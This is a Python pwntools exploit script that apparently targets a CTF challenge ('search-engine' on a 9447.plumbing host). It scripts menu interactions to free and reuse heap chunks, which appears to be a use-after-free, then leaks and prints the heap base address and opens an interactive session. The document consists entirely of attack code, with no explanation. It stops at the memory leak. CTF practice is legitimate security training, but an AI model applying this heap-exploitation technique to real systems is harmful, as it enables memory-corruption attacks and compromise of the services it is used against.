from pwn import *

r = remote('search-engine-qgidg858.9447.plumbing', 9447)


def SEARCH(s):
    r.recvuntil('3: Quit\n')
    r.sendline('1')
    r.recvuntil('size:\n')
    r.sendline(str(len(s)))
    r.recvuntil('Enter the word:\n')
    r.sendline(s)

def DEL(s):
    r.recvuntil('3: Quit\n')
    r.sendline('1')
    r.recvuntil('size:\n')
    r.sendline(str(len(s)))
    r.recvuntil('Enter the word:\n')
    r.send(s)
    r.recvuntil('(y/n)?\n')
    r.sendline('y')

def INPUT(s):
    r.recvuntil('3: Quit\n')
    r.sendline('2')
    r.recvuntil('size:\n')
    r.sendline(str(len(s)))
    r.recvuntil('Enter the sentence:\n')
    r.send(s)

INPUT('a aaaaaa')
INPUT('b b')
DEL('b')
DEL('a')
INPUT('a')
SEARCH('a')
print r.recvuntil('(y/n)?\n')
r.sendline('y')
s = r.recvuntil('(y/n)?\n')
print s
a = s.split('\n')
b = a[1].split(' ')
heap_base = u64(b[2] + '\x00'*(8 - len(b[2]))) & 0xFFFFFF00
print hex(heap_base)

r.interactive()


